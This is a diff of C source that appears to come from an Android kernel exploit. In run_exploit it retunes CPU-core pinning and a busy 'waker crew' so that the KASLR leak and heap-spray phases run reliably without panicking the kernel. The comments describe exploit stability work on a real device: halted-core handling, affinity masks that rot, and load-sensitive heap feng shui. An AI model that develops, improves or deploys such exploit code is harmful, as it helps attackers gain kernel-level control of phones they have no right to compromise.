@@ -647,20 +647,20 @@ int run_exploit(int argc, char **argv) {
   set_limit();
   log_startup_context();
   init_ashmem_path();
+  pr_info("payload build tag v1.2.10-quietheap (waker at gates only, "
+          "widen-restore masks)\n");
 
 #if defined(RMG_PIN_TEST_PRIME)
-  /* Stability gate (2026-08-27, round 4): the attempt requires a legally
-   * pinnable perf-core pair (choreography core + consumer core). Root
-   * cause of the dynamic "no perf core usable" wall: WALT core_ctl HALTS
-   * idle perf cores and the kernel rejects pinning onto halted cores
-   * (EINVAL). The quiet-window wait above idles the device, which halts
-   * the cluster — so spawn the busy waker crew FIRST: its demand makes
-   * core_ctl resume the perf cores before the gate probe (verified on
-   * device). The gate wait remains as safety net for thermal/hyp pauses
-   * that load cannot override. Running without a pinned pair is the
-   * ~50% kernel-panic gamble we no longer take. */
-  rmg_waker_start(6);
-  usleep(500 * 1000); /* let core_ctl eval see the demand */
+  /* Stability gate (2026-08-27, rounds 4-5): the attempt requires a
+   * legally pinnable perf-core pair. WALT core_ctl halts idle perf
+   * cores and the kernel rejects pinning onto halted cores; worse, it
+   * silently drops halted cores from any affinity mask it stores, so a
+   * long-lived task's mask rots across probe cycles (rmg_widen_mask
+   * counters that). The gate wait spawns the busy waker crew to resume
+   * halted cores, then the pair is pinned. The crew is STOPPED again
+   * right after the pin: the heap-shaping/spray phases need a quiet
+   * device (crew load broke the cache gate 12/12). Running without a
+   * pinned pair is the ~50% kernel-panic gamble we no longer take. */
   {
     const char *gw = getenv("RMG_PIN_GATE_WAIT_SEC");
     int gate_wait_sec = 180;
@@ -680,10 +680,12 @@ int run_exploit(int argc, char **argv) {
              "cleanly\n", CORE);
     return 1;
   }
-  /* Pair is locked: move the crew off the choreography cores so it
-   * cannot disturb the calibrated collision channel. The pinned exploit
-   * threads keep the pair cores busy, and halt only takes idle cores. */
-  rmg_waker_relocate(rmg_pinned_core, rmg_consumer_core);
+  /* Pair is locked and the main thread sits on the choreography core:
+   * retire the crew so the kaslr leak / heap spray run on a quiet
+   * device (their feng shui is load-sensitive). The pinned main thread
+   * keeps CORE busy; the consumer core is re-validated (and the crew
+   * respawned) at the pre-page gate. */
+  rmg_waker_stop();
 #else
   pin_to_core(CORE);
 #endif
